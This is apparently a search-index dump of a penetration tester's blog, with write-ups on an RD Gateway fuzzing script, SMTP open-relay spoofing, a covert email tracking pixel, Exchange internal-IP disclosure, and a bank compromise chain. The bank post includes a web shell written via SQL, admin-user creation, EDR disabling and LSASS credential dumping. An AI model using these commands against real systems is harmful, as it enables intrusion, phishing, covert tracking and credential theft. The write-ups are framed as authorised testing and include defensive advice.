{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Cybersecurity Blog Posts by Jamie Warren Philippe","text":"<p>Welcome to my collection of cybersecurity write-ups, where I explore real-world vulnerabilities, penetration testing techniques, and security misconfigurations.</p>"},{"location":"#featured-posts","title":"\ud83d\udccc Featured Posts:","text":"<ul> <li>Exploiting RD Gateway Vulnerability   A deep dive into abusing Remote Desktop Gateway misconfigurations.</li> <li>Exploiting SMTP Open Relays   How open SMTP relays can be abused for spam, phishing, and data exfiltration.</li> <li>How to Own a Bank   A pentesting story showcasing privilege escalation, lateral movement, and security failures.</li> <li>Microsoft Exchange Client Access Server Information Disclosure   Discusses an information disclosure bug in Exchange CAS revealing internal IPs.</li> <li>SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services   Explores how SNMP GETBULK can be exploited for large-scale DDoS amplification.</li> <li>Shadow IT \u2013 The Hidden Risk in Organizations   How unauthorized IT systems pose security risks and how to mitigate them.</li> </ul>"},{"location":"#additional-resources","title":"\ud83d\udcc2 Additional Resources:","text":"<ul> <li><code>source_codes/</code> - Contains proof-of-concept scripts and attack simulations.</li> </ul>"},{"location":"#disclaimer","title":"\u26a0\ufe0f Disclaimer:","text":"<p>These posts are for educational purposes only. The techniques discussed should only be used for legal penetration testing, security research, and ethical hacking.</p>"},{"location":"#feedback-contributions","title":"\ud83d\udce2 Feedback &amp; Contributions:","text":"<p>Feel free to raise issues, suggest improvements, or share your thoughts in the comments.</p> <p>\ud83d\ude80 Stay secure, stay ethical!</p>"},{"location":"CyberSecInvestigations/","title":"CyberSecurity_Investigations","text":""},{"location":"CyberSecInvestigations/#overview","title":"\ud83d\udea8 Overview","text":"<p>Welcome to the CyberSecurity_Investigations repository! This project serves as a comprehensive collection of real-world case studies, practical tools, and techniques aimed at helping cybersecurity professionals excel in their investigations. It covers a wide range of topics, including:</p> <ul> <li>Malware Analysis </li> <li>Digital Forensics </li> <li>Incident Response </li> <li>Threat Hunting </li> </ul> <p>This repository is designed for both beginners and seasoned professionals looking to enhance their skills in the field of cybersecurity. Whether you're analyzing suspicious files, conducting penetration tests, or investigating cybercrimes, you\u2019ll find valuable resources here.</p>"},{"location":"CyberSecInvestigations/#features","title":"\ud83d\udd10 Features","text":"<ul> <li>Case Studies: Real-world examples of cybersecurity investigations and incident responses.</li> <li>Tools &amp; Scripts: Practical tools and scripts to help in the investigation process (malware analysis, network traffic analysis, etc.).</li> <li>Educational Resources: Learn about techniques such as reverse engineering, forensics, and exploitation.</li> <li>Ongoing Updates: The repository is continually updated with new materials based on emerging trends in cybersecurity.</li> </ul>"},{"location":"CyberSecInvestigations/#disclaimer","title":"\u26a0\ufe0f Disclaimer","text":"<p>The content in this repository is strictly for educational and research purposes only. Unauthorized access to systems and data is illegal. Always obtain proper authorization before performing any penetration testing, vulnerability scanning, or security analysis.</p> <p>The author and contributors are not responsible for any misuse of the materials or actions taken based on the information in this repository. Proceed at your own risk.</p>"},{"location":"CyberSecInvestigations/#license","title":"\ud83d\udd11 License","text":"<p>This project is licensed under the MIT License. See the LICENSE file for more details.</p>"},{"location":"CyberSecInvestigations/#contributing","title":"\ud83d\udc65 Contributing","text":"<p>Contributions to this project are welcome! If you would like to contribute, just hit me up.</p>"},{"location":"CyberSecurity_investigations/","title":"Cybersecurity Blog Posts by Jamie Warren Philippe","text":"<p>Welcome to my collection of cybersecurity write-ups, where I explore real-world vulnerabilities, penetration testing techniques, and security misconfigurations.</p>"},{"location":"CyberSecurity_investigations/#featured-posts","title":"\ud83d\udccc Featured Posts:","text":"<ul> <li>Exploiting RD Gateway Vulnerability   A deep dive into abusing Remote Desktop Gateway misconfigurations.</li> <li>Exploiting SMTP Open Relays   How open SMTP relays can be abused for spam, phishing, and data exfiltration.</li> <li>How to Own a Bank   A pentesting story showcasing privilege escalation, lateral movement, and security failures.</li> <li>Microsoft Exchange Client Access Server Information Disclosure   Discusses an information disclosure bug in Exchange CAS revealing internal IPs.</li> <li>SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services   Explores how SNMP GETBULK can be exploited for large-scale DDoS amplification.</li> <li>Shadow IT \u2013 The Hidden Risk in Organizations   How unauthorized IT systems pose security risks and how to mitigate them.</li> </ul>"},{"location":"CyberSecurity_investigations/#additional-resources","title":"\ud83d\udcc2 Additional Resources:","text":"<ul> <li><code>source_codes/</code> - Contains proof-of-concept scripts and attack simulations.</li> </ul>"},{"location":"CyberSecurity_investigations/#disclaimer","title":"\u26a0\ufe0f Disclaimer:","text":"<p>These posts are for educational purposes only. The techniques discussed should only be used for legal penetration testing, security research, and ethical hacking.</p>"},{"location":"CyberSecurity_investigations/#feedback-contributions","title":"\ud83d\udce2 Feedback &amp; Contributions:","text":"<p>Feel free to raise issues, suggest improvements, or share your thoughts in the comments.</p> <p>\ud83d\ude80 Stay secure, stay ethical!</p>"},{"location":"ExploitingRDGatewayVuln/","title":"\ud83d\ude80 Exploiting RD Gateway Vulnerabilities with Malformed CONNECT_PKT_FRAGMENT Messages","text":"","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#introduction","title":"Introduction","text":"<p>Ah, Microsoft\u2019s Remote Desktop Gateway (RDG)\u2014the thing that lets you securely RDP over HTTPS while simultaneously serving as an all-you-can-exploit buffet for attackers. Today, we're diving into CVE-2020-0609 and CVE-2020-0610, two little gems that let us cause memory corruption and DoS with malformed packets. Because why not? </p> <p>Here\u2019s what\u2019s on the menu: 1. A breakdown of CONNECT_PKT_FRAGMENT packets. (Like an autopsy, but nerdier.) 2. How a malformed packet ruins RDG\u2019s day. 3. A Python fuzzing script to test for vulnerabilities. Because breaking things is fun.</p>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#understanding-the-connect_pkt_fragment-structure","title":"Understanding the CONNECT_PKT_FRAGMENT Structure","text":"<p>RD Gateway operates using fragments of connection packets (like your attention span on a Monday morning). A CONNECT_PKT_FRAGMENT usually looks like this:</p> Bytes Meaning <code>\\x03\\x00</code> TPKT Header (Length Indicator) <code>\\x00\\x13</code> Total Packet Length (19 bytes) <code>\\x0e\\xd0</code> Session Length/Fragment Size <code>\\x00\\x00</code> Flags or Reserved Bytes <code>\\x12\\x34</code> Transaction ID or Connection Identifier <code>\\x00\\x02</code> Fragment Count or Connection Status <code>\\x00\\x1f</code> Reserved or Message Type Indicator <code>\\x00\\x00</code> Padding or Checksum Placeholder <p>A malformed CONNECT_PKT_FRAGMENT can cause RDG to throw a tantrum, crash, and sometimes even give you remote code execution. Not ideal for sysadmins, but a delightful surprise for pentesters.</p>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#python-fuzzing-script-for-rd-gateway","title":"Python Fuzzing Script for RD Gateway","text":"<p>Want to stress-test RD Gateway? Here\u2019s a Python script that generates and sends malformed packets because, well, curiosity killed the cat\u2014but satisfaction brought it back.</p> <pre><code>import socket\nimport random\nimport struct\nimport time\n\n# Target RD Gateway server details\nTARGET_HOST = \"target-rd-gateway.com\"  # Change this to your target\nTARGET_PORT = 3391  # Default RDG port\n\n# Function to generate malformed CONNECT_PKT_FRAGMENT packets\ndef generate_malformed_packet():\n    \"\"\"\n    Generates a malformed CONNECT_PKT_FRAGMENT message.\n    Randomizes values to trigger unexpected behavior.\n    \"\"\"\n    packet = b\"\\x03\\x00\"  # TPKT Header\n    length = random.randint(10, 40)  # Random length to cause buffer overflows\n    packet += struct.pack(\"&gt;H\", length)  # Incorrect length field\n\n    # Randomized fragment payload with potentially dangerous values\n    packet += struct.pack(\"&gt;H\", random.randint(0x0001, 0xFFFF))  # Random fragment ID\n    packet += struct.pack(\"&gt;H\", random.randint(0x0001, 0xFFFF))  # Random size value\n    packet += struct.pack(\"&gt;H\", random.randint(0x0000, 0x00FF))  # Reserved bytes\n    packet += struct.pack(\"&gt;H\", random.randint(0x0000, 0xFFFF))  # Fake Connection ID\n    packet += struct.pack(\"&gt;H\", random.randint(0x0000, 0xFFFF))  # Invalid Fragment Count\n    packet += b\"\\x00\" * (length - len(packet))  # Padding with nulls to match length\n\n    return packet\n\n# Function to send malformed packets\ndef send_malformed_packet():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        try:\n            print(f\"[+] Connecting to {TARGET_HOST}:{TARGET_PORT}...\")\n            sock.connect((TARGET_HOST, TARGET_PORT))\n\n            for i in range(10):  # Send multiple packets to test behavior\n                payload = generate_malformed_packet()\n                print(f\"[+] Sending malformed packet {i+1}...\")\n                sock.send(payload)\n\n                try:\n                    response = sock.recv(1024)\n                    print(f\"[-] Response: {response.hex()}\")\n                except socket.timeout:\n                    print(\"[!] No response (possible crash)\")\n\n                time.sleep(1)  # Delay between attempts\n\n        except Exception as e:\n            print(f\"[!] Error: {e}\")\n\n# Run the attack simulation\nsend_malformed_packet()\n</code></pre>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#expected-outcomes","title":"Expected Outcomes","text":"<ul> <li>If the service crashes \u2192 Congrats, you found a vulnerability! \ud83c\udf89</li> <li>If you get an error message \u2192 RDG might be patched, or you need to be sneakier.</li> <li>If nothing happens \u2192 Well, that\u2019s anticlimactic.</li> </ul>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#mitigations-recommendations","title":"Mitigations &amp; Recommendations","text":"<ul> <li>Patch RD Gateway (Yes, we know updates are annoying, but so is getting pwned).</li> <li>Enable Network-Level Authentication (NLA) to reduce exposure.</li> <li>Use an IDS/IPS to detect and block malformed RDP packets before they ruin your day.</li> <li>Restrict RD Gateway access\u2014seriously, don\u2019t let the entire internet RDP into your network.</li> </ul>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"ExploitingRDGatewayVuln/#conclusion","title":"Conclusion","text":"<p>And there you have it! By sending malformed CONNECT_PKT_FRAGMENT messages, we can make RD Gateway go boom. Use responsibly, disclose responsibly, and maybe buy your blue team a coffee after testing (because you will give them a headache). </p> <p>\ud83d\udd39 Want to explore RCE exploitation? Stay tuned for the next post! \ud83d\ude80</p> <p>\ud83d\udcac Have questions or feedback? Drop a comment below, or send a strongly worded email to your nearest sysadmin! \ud83d\ude09</p>","tags":["RDP","Exploit","CVE-2020-0609","CVE-2020-0610"]},{"location":"Exploiting_SMTP_Open_Relays/","title":"Exploiting SMTP Open Relays \u2013 When Mail Servers Become Attack Vectors","text":"","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#introduction","title":"Introduction","text":"<p>In penetration testing, some of the most overlooked yet dangerous vulnerabilities come from misconfigured mail servers. Specifically, an SMTP open relay allows unauthorized users to send emails as anyone\u2014a perfect recipe for phishing, social engineering, and spoofing attacks. Let\u2019s explore how attackers exploit this misconfiguration and how organizations can defend against it.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#the-basics-of-smtp-open-relays","title":"The Basics of SMTP Open Relays","text":"<p>SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending emails. However, a mail server should only relay messages from authorized senders. An open relay is a misconfigured SMTP server that allows anyone to send emails, effectively letting attackers impersonate legitimate users.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#why-is-this-dangerous","title":"\ud83d\udd25 Why is this dangerous?","text":"<p>\u2705 Email Spoofing: Attackers can send emails that appear to come from trusted sources. \u2705 Bypassing Spam Filters: Since the email originates from a legitimate domain, it may evade security measures. \u2705 Phishing Attacks: Hackers can craft highly convincing fake emails. \u2705 Spreading Malware &amp; Ransomware: Victims may download malicious payloads.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#real-world-attack-scenario","title":"Real-World Attack Scenario","text":"<p>\ud83d\udc80 Target: A financial institution\u2019s SMTP relay</p> <p>During a penetration test, we discovered that the an organisation\u2019s SMTP server allowed unauthenticated mail relays. Using this misconfiguration, we:</p> <p>1\ufe0f\u20e3 Spoofed emails from <code>security@organisation.com</code> and sent them to employees. 2\ufe0f\u20e3 Created a phishing campaign that instructed users to reset their VPN credentials. 3\ufe0f\u20e3 Harvested multiple valid credentials, leading to lateral movement within the network.</p> <p>\ud83d\udea8 Impact: This attack could have been used for internal fraud, account takeovers, or ransomware deployment.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#exploiting-an-open-relay","title":"Exploiting an Open Relay","text":"<p>Once an SMTP open relay is found, testing it is straightforward using <code>swaks</code>: <pre><code>swaks --to victim@target.com --from ceo@target.com --server mail.target.com\n</code></pre> If the email is delivered successfully without authentication, the mail server is an open relay.</p> <p>Another method is using <code>telnet</code>: <pre><code>telnet mail.target.com 25\nHELO attacker.com\nMAIL FROM: ceo@target.com\nRCPT TO: victim@target.com\nDATA\nSubject: Urgent Security Update\nPlease reset your password at http://fake-reset.com\n.\nQUIT\n</code></pre> If the email is relayed successfully, the vulnerability is confirmed.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#defending-against-smtp-open-relays","title":"Defending Against SMTP Open Relays","text":"<p>\ud83d\udd12 Best Practices: \u2714\ufe0f Restrict Relaying: Ensure that only authenticated users can send emails. \u2714\ufe0f Implement SPF, DKIM, and DMARC: Prevent spoofed emails from passing security checks. \u2714\ufe0f Monitor and Log SMTP Traffic: Look for unusual spikes in outgoing emails. \u2714\ufe0f Test Your Mail Server: Use <code>swaks</code> or <code>smtpdiag</code> to check for unauthorized relays. \u2714\ufe0f Block External SMTP Traffic on Firewalls: Unless necessary, prevent outbound traffic on port 25.</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"Exploiting_SMTP_Open_Relays/#conclusion","title":"Conclusion","text":"<p>SMTP open relays are a silent but powerful attack vector that can lead to devastating phishing campaigns, credential theft, and fraud. Regular security audits, proper mail server configuration, and strict email policies can mitigate these risks.</p> <p>\ud83d\ude80 Pentesters: Always test for open relays, as they can provide easy entry points. \ud83d\udd10 Defenders: Secure your mail servers before an attacker finds them first.</p> <p>\ud83d\udcac Have you ever encountered an SMTP open relay in the wild? Share your experiences below!</p>","tags":["SMTP","OPEN","ATTACK VECTOR","Exploitation"]},{"location":"GetUserLocation/","title":"Tracking User Location from an Email","text":""},{"location":"GetUserLocation/#introduction","title":"Introduction","text":"<p>In this absolutely innocent project, I\u2019ll show you how to \"gently\" track someone's location using nothing more than a harmless broken image link embedded in an email. This perfectly ethical approach will help you understand how tracking mechanisms work and how your email signature can become the perfect little spy tool.</p>"},{"location":"GetUserLocation/#project-overview","title":"Project Overview","text":"<p>This project features two super simple components (don\u2019t worry, no one gets hurt):</p> <ol> <li>Tracking Mechanism: Embed a completely harmless broken image in your email signature. What could possibly go wrong? This triggers a request to a logging script on your server.</li> <li>Email Setup: Use your trusty Proton email account to send the email because, well, Google might just get suspicious of your shenanigans and ruin the fun.</li> </ol>"},{"location":"GetUserLocation/#step-by-step-implementation","title":"Step-by-Step Implementation","text":""},{"location":"GetUserLocation/#1-creating-the-tracking-script-logphp","title":"1. Creating the Tracking Script (<code>log.php</code>)","text":"<p>First, you need a script that tracks the poor unsuspecting soul who opens your email. Here\u2019s the PHP code to get the job done:</p> <pre><code>&lt;?php\ninclude 'functions.php';\n\n$browser = getBrowser();\n$date    = date('m/d/y g:i A');\n$ip      = getIP();\n$referer = getReferer();\n$logData = \"[$date] $browser | $ip | $referer\" . PHP_EOL;\n\n// Log access to the text file, creating it if it doesn't exist\nfile_put_contents('logs.txt', $logData, FILE_APPEND);\n\n// Optionally serve a tracking image\necho '&lt;img src=\"sig.png\"&gt;';\n?&gt;\n</code></pre>"},{"location":"GetUserLocation/#2-utility-functions-functionsphp","title":"2. Utility Functions (<code>functions.php</code>)","text":"<p>You\u2019ll need a few handy functions to extract crucial info, like where the person is sitting and what browser they're using. Here\u2019s how:</p> <pre><code>&lt;?php\nfunction getBrowser() {\n    return $_SERVER['HTTP_USER_AGENT'] ?? \"Unknown User-Agent\";\n}\n\nfunction getIP() {\n    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        return trim($ipList[0]); // Return the first IP from the list\n    }\n    return $_SERVER['REMOTE_ADDR'] ?? \"Unknown IP\";\n}\n\nfunction getReferer() {\n    return $_SERVER['HTTP_REFERER'] ?? \"Unknown Referer\";\n}\n?&gt;\n</code></pre>"},{"location":"GetUserLocation/#3-configuring-htaccess","title":"3. Configuring <code>.htaccess</code>","text":"<p>Now, to make sure that things go smoothly and no one can stop you (legally), configure the <code>.htaccess</code> file to redirect requests like a pro:</p> <pre><code>RewriteEngine On\n\n# Allow access to index.html only\nRewriteCond %{REQUEST_FILENAME} !index\\.html$\n\n# Deny access to all .php files (prevent direct access)\nRewriteRule \\.php$ - [F,L]\n\n# Reroute index.html requests to log.php\nRewriteRule ^index\\.html$ log.php [L]\n\n# Prevent directory listing\nOptions -Indexes\n</code></pre>"},{"location":"GetUserLocation/#4-setting-up-the-email","title":"4. Setting Up the Email","text":"<p>To track user activity via email (because why wouldn\u2019t you?): 1. Add an image to your email signature that points to the HTML file on your server. You know, so you can track your \"innocent\" recipients. 2. Send the email using a Proton email account (because Google is a buzzkill and might block the fun).</p>"},{"location":"GetUserLocation/#how-it-works","title":"How It Works","text":"<p>When your recipient opens the email and, of course, loads the \"harmless\" broken image in the signature, a request is made to <code>log.php</code>. The script logs everything about them \u2014 their IP address, their browser details, and their browsing habits (well, at least the one time they opened your email). The data is then saved in <code>logs.txt</code>. Totally not creepy, right?</p>"},{"location":"GetUserLocation/#ethical-considerations","title":"Ethical Considerations","text":"<p>While this project is a fun way to explore how tracking works, let\u2019s all be responsible human beings here. Don\u2019t go invading privacy or violating laws, okay? This is purely for educational purposes, and we all know how that goes.</p>"},{"location":"How_to_Own_a_Bank/","title":"From Directory Listing to Owning a Bank: A Wild Ride with phpMyAdmin, XAMPP, and a PAM that Didn't Give a Damn","text":"","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#the-setup-oops-we-left-everything-open","title":"The Setup: \"Oops, We Left Everything Open\"","text":"<p>So there I was, minding my own business (aka breaking into a bank\u2019s network for totally legal reasons), when I stumbled upon a webserver running XAMPP on a fully patched Windows Server. At first, I thought, \"Okay, maybe they actually know what they're doing.\" Then, I ran <code>dirb</code> and found directory listing enabled. Rookie mistake #1.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-1-the-accidental-gift-directory-listing","title":"Step 1: The Accidental Gift \u2013 Directory Listing","text":"<p>It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran: <pre><code>dirb http://targetbank.com/\n</code></pre> Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic. and I was in. Rookie mistake #2.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise","title":"Step 2: Oh Look, PhpMyAdmin \u2013 Let\u2019s Try Defaults and give them a supprise!","text":"<p>I took a gamble and tried the usual default credentials: <pre><code>Username: root\nPassword: (blank)\n</code></pre> Guess what? It worked. Because, of course, it did.  With full control over the database, I simply used <code>SELECT INTO OUTFILE</code> to write a PHP web shell directly into <code>htdocs</code>. <pre><code>SELECT '&lt;?php system($_GET[\"cmd\"]); ?&gt;' INTO OUTFILE 'C:/xampp/htdocs/shell.php';\n</code></pre> Boom. Webshell live at <code>http://bankserver/shell.php</code>.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-3-making-myself-at-home-persistence-101","title":"Step 3: Making Myself at Home (Persistence 101)","text":"<p>Checking the privileges, I realized XAMPP was running under NT AUTHORITY\\SYSTEM. Oh, this was going to be fun.Rookie mistake #3. And also, I wasn\u2019t about to leave this beautiful new playground unprotected. So, using my webshell, I ran: <pre><code>curl \"http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add\"\ncurl \"http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add\"\n</code></pre> BOOOOM!!! Hello, new local admin user.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-4-fighting-cylance-edr-and-winning","title":"Step 4: Fighting Cylance EDR (and Winning)","text":"<p>This is where things got even funnier. Every time I tried to run Mimikatz, Cylance EDR slapped me like an overprotective parent. So I tried stopping the service: <pre><code>sc stop Cylance\n</code></pre> Cylance: \"LOL, you thought.\" The service was marked non-stoppable.</p> <p>But guess what? I could still change the startup type: <pre><code>sc config Cylance start= demand\n</code></pre> Now, I just needed to reboot the server. I used the good old \"extended ping\" trick to monitor when it was back: <pre><code>ping -t bankserver\n</code></pre> As soon as it came online, I refreshed my webshell. This time, Mimikatz worked like a charm. With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking,  <pre><code>mimikatz# sekurlsa::minidump lsass.dmp\n</code></pre></p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-5-rdp-and-session-hijacking","title":"Step 5: RDP and Session Hijacking","text":"<p>Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier:</p> <p><pre><code>rdesktop -u pentester -p mysecurepassword targetbank.com\n</code></pre> Once in, I used PsExec to elevate myself to SYSTEM:</p> <p><pre><code>PsExec.exe -s -i cmd.exe\n</code></pre> And ran: <pre><code>query session\n</code></pre> Guess what? Administrator left their session inactive but open. Rookie mistake #4. I could not let it like this without Hijacking it.</p> <p><pre><code>tscon 2 /dest:console\n</code></pre> And boom\u2014Administrator session hijacked. But then\u2026 poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump.</p> <p>So, I cracked the dump offline: <pre><code>mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit\n</code></pre> or using Linux:</p> <p><pre><code>pypykatz lsa minidump lsass.dmp\n</code></pre> And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?)</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#step-6-the-domain-controller-the-cyberark-pam-disaster","title":"Step 6: The Domain Controller &amp; The CyberArk \"PAM\" Disaster","text":"<p>While moving laterally, I hit the Domain Controller. This is where things took an unexpected turn. I also found a network-mounted drive on the initial compromised machine containing a plaintext file with a URL to their PAM (CyberArk). \ud83e\udd26</p> <p>So, being the responsible hacker I am, I:     - Used the credentials obtained from LSASS dump cracking.     - Logged into the Domain Controller.     - Created a domain admin account.     - Added special permissions to that account to be able to use the PAM.</p> <p>Then I logged into CyberArk with my shiny new domain admin account, and... oh boy. It gave me access to the core banking system.  Because why have proper access controls when you can just let your pentester waltz right in?</p> <p>Insert evil laughter here.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#the-aftermath","title":"The Aftermath","text":"<p>At this point, I basically had the keys to the kingdom. This entire chain of failures was due to a mix of: 1. Directory listing enabled 2. phpMyAdmin with default creds 3. XAMPP running as SYSTEM 4. EDR that I could disable with a simple restart 5. A bank that stored their own security tool URLs in a plaintext file 6. Domain-wide local admin credentials</p> <p>If this wasn\u2019t a real pentest, it would have made a fantastic heist movie.</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"How_to_Own_a_Bank/#moral-of-the-story","title":"Moral of the Story:","text":"<p>Secure your systems, disable default credentials, and please don\u2019t leave your privileged accounts lying around. Otherwise, you\u2019ll end up reading about your security failures in a blog post like this. \ud83d\ude0f</p>","tags":["Core","Banking","Privilege Escalation","Exploitation"]},{"location":"LICENCE/","title":"LICENCE","text":"<p>MIT License  </p> <p>Copyright (c) 2025 Jamie Warren Philippe  </p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \u201cSoftware\u201d), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  </p> <ol> <li> <p>Attribution Required: Any use, modification, or distribution of this    work must include proper credit to Jamie Warren Philippe as the original author.  </p> </li> <li> <p>No Warranty &amp; No Liability: This software is provided \"as is\", without    warranty of any kind, express or implied, including but not limited to the    warranties of merchantability, fitness for a particular purpose, and    noninfringement.  </p> </li> </ol> <p>The author is not responsible for any misuse, illegal activity, or    consequences resulting from the use of this content. These materials    are for educational and research purposes only.  </p> <ol> <li>Modifications &amp; Redistribution: You are free to modify and share this    work, but you must retain this license and clearly indicate any changes made.  </li> </ol> <p>By using this software, you agree to these terms.  </p> <p>\ud83d\ude80 Respect the craft, give credit where it's due, and use responsibly! </p>"},{"location":"MsExchangeInfoDisclosure/","title":"Microsoft Exchange Client Access Server Information Disclosure: The \"Oops, Here\u2019s My Internal IP\" Bug","text":"","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#the-scene-an-external-pentest-gone-too-well","title":"The Scene: An External Pentest Gone Too Well","text":"<p>Ah, Microsoft Exchange\u2014the gift that keeps on giving. During an external penetration test, I stumbled upon an information disclosure bug that made recon a breeze. Instead of sweating over OSINT and pivoting through obscure DNS leaks, the Exchange Client Access Server (CAS) decided to just hand me its internal IP like a confused mall security guard giving out the WiFi password.</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#the-setup-iis-100-http10-and-a-misconfigured-host-header","title":"The Setup: IIS 10.0, HTTP/1.0, and a Misconfigured Host Header","text":"<p>The server was running IIS 10.0, and I found that if you send a good ol\u2019 HTTP/1.0 request while supplying an empty Host header, the response would include some juicy internal information\u2014specifically, the private IP address of the server, neatly tucked away in the WWW-Authenticate realm header.</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#the-elite-exploit-aka-running-curl","title":"The \"Elite\" Exploit (a.k.a. Running Curl)","text":"<p>This is one of those exploits where you don\u2019t need a fancy zero-day or an obscure Python script. Nope, just some good old curl:</p> <pre><code>curl -X GET http://target.com/owa/ -H \"Host:\" --http1.0 -i\n</code></pre>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#expected-response","title":"Expected Response:","text":"<pre><code>HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Negotiate\nWWW-Authenticate: NTLM realm=\"192.168.1.50\"\n</code></pre> <p>Oh no, Exchange! You weren\u2019t supposed to tell me that!</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#why-this-works-exchange-iis-being-helpful","title":"Why This Works: Exchange + IIS Being \"Helpful\"","text":"<p>By default, Exchange CAS servers running on IIS 10.0 love to respond to authentication requests in a way that includes the internal realm. Normally, this isn\u2019t an issue\u2014unless, of course, someone forgot to properly configure the headers and now every unauthenticated request leaks the internal network structure.</p> <p>And let\u2019s be honest: most admins are too busy fighting Outlook issues to bother with security headers.</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#the-why-should-you-care-section","title":"The \"Why Should You Care?\" Section","text":"<p>What can an attacker do with an internal IP? Well, for starters: - Refine attack paths: Knowing the internal structure makes pivoting much easier. - Bypass some poorly configured security policies: If there's a split-tunnel VPN or weak firewall rules, this can be gold. - Social engineering fuel: \"Oh hey, IT helpdesk? Yeah, I\u2019m calling from 192.168.1.50, we got a problem...\" NGL, I lacked some inspiration on that one</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#how-to-fix-this-if-youre-an-admin-and-now-panicking","title":"How to Fix This (If You\u2019re an Admin and Now Panicking)","text":"<p>Luckily, this one\u2019s an easy fix (assuming you don\u2019t ignore it like that pile of pending updates on your test server):</p> <ol> <li>Disable NTLM authentication over HTTP (force it over HTTPS)</li> <li>Set up proper response headers to avoid leaking internal details</li> <li>Use a reverse proxy or WAF to filter and block HTTP/1.0 requests</li> <li>Audit Exchange CAS configurations (because this probably isn\u2019t the only issue)</li> </ol>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"MsExchangeInfoDisclosure/#final-thoughts","title":"Final Thoughts","text":"<p>It\u2019s 2025, and Microsoft Exchange is still finding new ways to embarrass itself. But hey, if you\u2019re a pentester, it\u2019s free recon with minimal effort\u2014so thanks, Exchange, for making external engagements just a little bit easier. \ud83c\udf89</p> <p>Next Up: \"From Directory Listing to Webshell to Domain Admin\u2014Because Why Make It Hard?\"</p>","tags":["Microsoft","Exchange","Information Attack","Disclosure","Exploitation"]},{"location":"dirEnum500/","title":"The Art of Custom Exploits","text":"<p>Here's a funny and sarcastic take on your blog post:</p> <p><pre><code># Directory Enumeration: Unveiling Hidden Paths Through Error Message Misconfiguration\n\nAh, the sweet joy of navigating web applications\u2014kind of like a treasure hunt, but with a lot more frustration and a few *potential* security issues along the way. Recently, while doing my usual routine of poking around a web app during a 